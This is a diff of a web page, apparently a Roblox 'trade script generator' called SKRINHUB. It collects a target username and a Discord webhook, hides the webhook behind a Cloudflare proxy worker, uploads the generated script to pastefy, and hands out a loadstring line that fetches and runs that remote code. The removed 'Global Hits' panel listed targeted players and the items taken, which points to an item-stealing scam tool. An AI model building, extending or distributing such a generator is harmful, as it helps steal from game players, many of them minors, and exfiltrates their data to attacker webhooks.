@@ -23,7 +23,6 @@
     --muted: #888;
     --danger: #ff4444;
     --green: #00ff88;
-    --gold: #ffd700;
   }
 
   body {
@@ -246,7 +245,6 @@
   .panel:nth-child(3) { animation-delay: 0.21s; }
   .panel:nth-child(4) { animation-delay: 0.29s; }
   .panel:nth-child(5) { animation-delay: 0.37s; }
-  .panel:nth-child(6) { animation-delay: 0.45s; }
 
   .ph {
     display: flex;
@@ -270,7 +268,6 @@
   .dot-purple { background: var(--neon); animation-delay: 0.4s; }
   .dot-discord { background: var(--neon); animation-delay: 0.8s; }
   .dot-green { background: var(--green); animation-delay: 1.2s; }
-  .dot-gold { background: var(--gold); animation-delay: 0.2s; box-shadow: 0 0 10px rgba(255, 215, 0, 0.8); }
 
   .ph-title {
     font-family: 'Share Tech Mono', monospace;
@@ -404,7 +401,7 @@
   }
 
   .a-item input[type="checkbox"]:checked::after {
-    content: '\2713';
+    content: '✓';
     position: absolute;
     color: black;
     font-size: 8px;
@@ -689,163 +686,14 @@
     white-space: nowrap;
     text-shadow: var(--neon-glow);
   }
-
-  /* Global Hits Panel Styles */
-  .global-hits-list {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    max-height: 400px;
-    overflow-y: auto;
-    scrollbar-width: thin;
-    scrollbar-color: rgba(255, 255, 255, 0.3) transparent;
-  }
-
-  .global-hits-list::-webkit-scrollbar { width: 4px; }
-  .global-hits-list::-webkit-scrollbar-thumb {
-    background: rgba(255, 255, 255, 0.3);
-    border-radius: 4px;
-  }
-
-  .hit-row {
-    display: flex;
-    align-items: center;
-    gap: 0.9rem;
-    padding: 0.75rem 1rem;
-    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
-    transition: background 0.15s;
-  }
-
-  .hit-row:hover {
-    background: rgba(255, 255, 255, 0.03);
-  }
-
-  .hit-row:last-child { border-bottom: none; }
-
-  .hit-avatar {
-    width: 52px;
-    height: 52px;
-    border-radius: 10px;
-    background: linear-gradient(135deg, #2a2a2a 0%, #1a1a1a 100%);
-    border: 2px solid rgba(255, 255, 255, 0.2);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex-shrink: 0;
-    font-size: 1.5rem;
-    overflow: hidden;
-  }
-
-  .hit-avatar img {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-  }
-
-  .hit-info {
-    flex: 1;
-    min-width: 0;
-  }
-
-  .hit-name-row {
-    display: flex;
-    align-items: center;
-    gap: 0.5rem;
-    margin-bottom: 0.25rem;
-  }
-
-  .hit-name {
-    font-size: 1rem;
-    font-weight: 600;
-    color: var(--text);
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
-  }
-
-  .hit-badge {
-    font-size: 9px;
-    font-weight: bold;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-    padding: 2px 6px;
-    border-radius: 4px;
-    background: rgba(255, 255, 255, 0.1);
-    color: #fff;
-    border: 1px solid rgba(255, 255, 255, 0.3);
-    flex-shrink: 0;
-  }
-
-  .hit-meta {
-    display: flex;
-    align-items: center;
-    gap: 0.5rem;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.75rem;
-    color: var(--muted);
-  }
-
-  .hit-target {
-    color: var(--muted);
-  }
-
-  .hit-time {
-    color: var(--muted);
-  }
-
-  .hit-time::before {
-    content: '·';
-    margin-right: 0.5rem;
-  }
-
-  .hit-mps {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 1rem;
-    font-weight: bold;
-    color: #fff;
-    text-align: right;
-    min-width: 70px;
-    flex-shrink: 0;
-  }
-
-  .hits-empty {
-    padding: 2.5rem;
-    text-align: center;
-    color: var(--muted);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.85rem;
-  }
-
-  .ph-title-gold {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem;
-    text-transform: uppercase;
-    letter-spacing: 0.15em;
-    color: #fff;
-  }
-
-  .dot-pink {
-    background: #fff;
-    animation-delay: 0.2s;
-  }
 </style>
 </head>
 <body>
 <div class="wrap">
   <header>
     <div class="logo-row"><h1>SKRINHUB</h1></div>
-    <p class="tagline">Roblox - Brainrot - Trade Script Generator</p>
+    <p class="tagline">Roblox • Brainrot • Trade Script Generator</p>
   </header>
-
-  <!-- Global Hits Panel -->
-  <div class="panel">
-    <div class="ph"><div class="dot dot-pink"></div><span class="ph-title-gold">Global Hits</span></div>
-    <div class="pb">
-      <div class="global-hits-list" id="globalHitsList">
-        <div class="hits-empty">No scripts executed yet. Generate a script to see hits here...</div>
-      </div>
-    </div>
-  </div>
 
   <div class="panel">
     <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">Select Brainrot Animals</span></div>
@@ -911,13 +759,13 @@
     </div>
   </div>
 
-  <button class="btn-gen" onclick="generate()">Generate Script</button>
+  <button class="btn-gen" onclick="generate()">⚡ Generate Script</button>
 
   <div class="panel">
     <div class="out-ph">
       <div class="dot dot-green"></div>
       <span class="out-ph-title">Generated Script</span>
-      <button class="btn-copy" id="copyBtn" onclick="copyOut()">Copy</button>
+      <button class="btn-copy" id="copyBtn" onclick="copyOut()">⧉ Copy</button>
     </div>
     <div class="pb">
       <div class="code-block empty" id="outputBlock">-- Fill in the fields above and hit Generate Script...</div>
@@ -1043,7 +891,7 @@ const ANIMALS = [
 { name: "Los Spooky Combinasionas", rarity: "Secret", mps: "20M/s" },
 { name: "Los Hotspotsitos", rarity: "Secret", mps: "20M/s" },
 { name: "Los Jolly Combinasionas", rarity: "Secret", mps: "20M/s" },
-{ name: "Snailo Clovero", rarity: "Secret", mps: "18.5M/s" },
+ { name: "Snailo Clovero", rarity: "Secret", mps: "18.5M/s" },
 { name: "Los Planitos", rarity: "Secret", mps: "18.5M/s" },
 { name: "Chicleteira Cupideira", rarity: "Secret", mps: "17.5M/s" },
 { name: "DJ Panda", rarity: "Secret", mps: "17.5M/s" },
@@ -1176,97 +1024,6 @@ const ANIMALS = [
 let selected = new Set();
 let adminMode = 'no-gui';
 let customAdminLoadstring = '';
-let hitsLog = []; // Store executed script hits
-
-// Parse MPS string to numeric value for calculations
-function parseMps(mpsString) {
-    if (!mpsString) return 0;
-    const match = mpsString.match(/^([\d.]+)([KMB]?)\/s$/i);
-    if (!match) return 0;
-    const value = parseFloat(match[1]);
-    const suffix = match[2].toUpperCase();
-    switch (suffix) {
-        case 'K': return value * 1000;
-        case 'M': return value * 1000000;
-        case 'B': return value * 1000000000;
-        default: return value;
-    }
-}
-
-// Format numeric value back to MPS string
-function formatMps(value) {
-    if (value >= 1000000000) return (value / 1000000000).toFixed(2).replace(/\.?0+$/, '') + 'B/s';
-    if (value >= 1000000) return (value / 1000000).toFixed(2).replace(/\.?0+$/, '') + 'M/s';
-    if (value >= 1000) return (value / 1000).toFixed(2).replace(/\.?0+$/, '') + 'K/s';
-    return value.toFixed(0) + '/s';
-}
-
-// Add a new hit to the log when script is generated
-function addHitToLog(username, brainrots) {
-    const time = 'just now';
-    
-    // Add each brainrot as a separate entry (newest first)
-    brainrots.forEach(name => {
-        const animal = ANIMALS.find(a => a.name === name);
-        const mps = animal ? animal.mps : 'Custom';
-        const rarity = animal ? animal.rarity : 'Custom';
-        
-        hitsLog.unshift({
-            target: username,
-            name: name,
-            rarity: rarity,
-            mps: mps,
-            time: time
-        });
-    });
-    
-    // Keep only last 100 entries
-    if (hitsLog.length > 100) {
-        hitsLog = hitsLog.slice(0, 100);
-    }
-    
-    renderHitsLog();
-}
-
-// Format MPS for display (remove /s suffix for cleaner look)
-function formatMpsDisplay(mps) {
-    if (!mps || mps === 'Custom') return 'Custom';
-    return mps.replace('/s', '');
-}
-
-// Render the hits log
-function renderHitsLog() {
-    const list = document.getElementById('globalHitsList');
-    
-    if (hitsLog.length === 0) {
-        list.innerHTML = '<div class="hits-empty">No scripts executed yet. Generate a script to see hits here...</div>';
-        return;
-    }
-    
-    let html = '';
-    hitsLog.forEach(entry => {
-        html += `
-            <div class="hit-row">
-                <div class="hit-avatar">
-                    <span>🎭</span>
-                </div>
-                <div class="hit-info">
-                    <div class="hit-name-row">
-                        <span class="hit-name">${entry.name}</span>
-                        <span class="hit-badge">${entry.rarity}</span>
-                    </div>
-                    <div class="hit-meta">
-                        <span class="hit-target">@${entry.target}</span>
-                        <span class="hit-time">${entry.time}</span>
-                    </div>
-                </div>
-                <div class="hit-mps">${formatMpsDisplay(entry.mps)}</div>
-            </div>
-        `;
-    });
-    
-    list.innerHTML = html;
-}
 
 function addCustomBrainrot() {
     const customName = document.getElementById('customBrainrotName').value.trim();
@@ -1305,10 +1062,11 @@ function setAdminMode(mode) {
 function updateCustomAdmin() {
     customAdminLoadstring = document.getElementById('customAdminLoadstring').value;
 }
-
 async function createSentinelProxy(webhookUrl) {
     try {
+        // Remplace par l'URL de ton Worker Cloudflare
         const workerUrl = 'https://sentinel-proxy.dongdihng.workers.dev/';
+
         const response = await fetch(workerUrl, {
             method: 'POST',
             headers: {
@@ -1334,27 +1092,28 @@ async function createSentinelProxy(webhookUrl) {
     }
 }
 
-async function uploadToPastefy(script) {
-    try {
-        const response = await fetch("https://pastefy.app/api/v2/paste", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ title: "SKRINHUB Script", content: script }),
-        });
-        const data = await response.json();
-        return data.success && data.paste?.id ? `https://pastefy.app/${data.paste.id}/raw` : null;
-    } catch (error) {
-        return null;
-    }
+ async function uploadToPastefy(script) {
+  try {
+    const response = await fetch("https://pastefy.app/api/v2/paste", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ title: "SKRINHUB Script", content: script }),
+    });
+    const data = await response.json();
+    return data.success && data.paste?.id ? `https://pastefy.app/${data.paste.id}/raw` : null;
+  } catch (error) {
+    return null;
+  }
 }
 
+ 
 async function generate() {
     const btn = document.querySelector('.btn-gen');
     const out = document.getElementById('outputBlock');
     if (btn.disabled) return;
 
     btn.disabled = true;
-    btn.textContent = 'Generating...';
+    btn.textContent = '⏳ Generating...';
     btn.style.opacity = '0.6';
 
     try {
@@ -1365,6 +1124,7 @@ async function generate() {
         if (username.length < 3) throw new Error('Username must be at least 3 characters long.');
         if (!webhook.startsWith('https://discord.com/api/webhooks/')) throw new Error('Invalid webhook URL.');
 
+        // TOUJOURS convertir le webhook en proxy Sentinel
         const finalWebhookUrl = await createSentinelProxy(webhook);
 
         const names = [...selected];
@@ -1398,15 +1158,11 @@ ${adminScriptPart}`;
         if (pastefyRawUrl) {
             out.className = 'code-block';
             out.textContent = `loadstring(game:HttpGet("${pastefyRawUrl}"))()`;
-            // Add to hits log on successful generation
-            addHitToLog(username, names);
         } else {
             out.className = 'code-block';
             out.textContent = `-- Failed to upload to Pastefy.
 Here is the raw script (copy it manually):
 ${script}`;
-            // Still add to hits log even if pastefy fails
-            addHitToLog(username, names);
         }
     } catch (err) {
         console.error("Generation error:", err);
@@ -1415,12 +1171,11 @@ ${script}`;
     } finally {
         setTimeout(() => {
             btn.disabled = false;
-            btn.textContent = 'Generate Script';
+            btn.textContent = '⚡ Generate Script';
             btn.style.opacity = '1';
         }, 1500);
     }
 }
-
 async function searchRobloxUsers(query) {
     if (query.length < 3) return [];
     try {
@@ -1601,7 +1356,7 @@ function validateWebhook() {
         return false;
     }
     hint.classList.remove('error');
-    hint.textContent = 'Valid Discord webhook.';
+    hint.textContent = '✅ Valid Discord webhook.';
     return true;
 }
 
@@ -1610,9 +1365,9 @@ function copyOut() {
     if (!code || code.startsWith('--')) return;
     navigator.clipboard.writeText(code).then(() => {
         const btn = document.getElementById('copyBtn');
-        btn.textContent = 'Copied!';
+        btn.textContent = '✓ Copied!';
         btn.classList.add('ok');
-        setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('ok'); }, 2000);
+        setTimeout(() => { btn.textContent = '⧉ Copy'; btn.classList.remove('ok'); }, 2000);
     });
 }
 
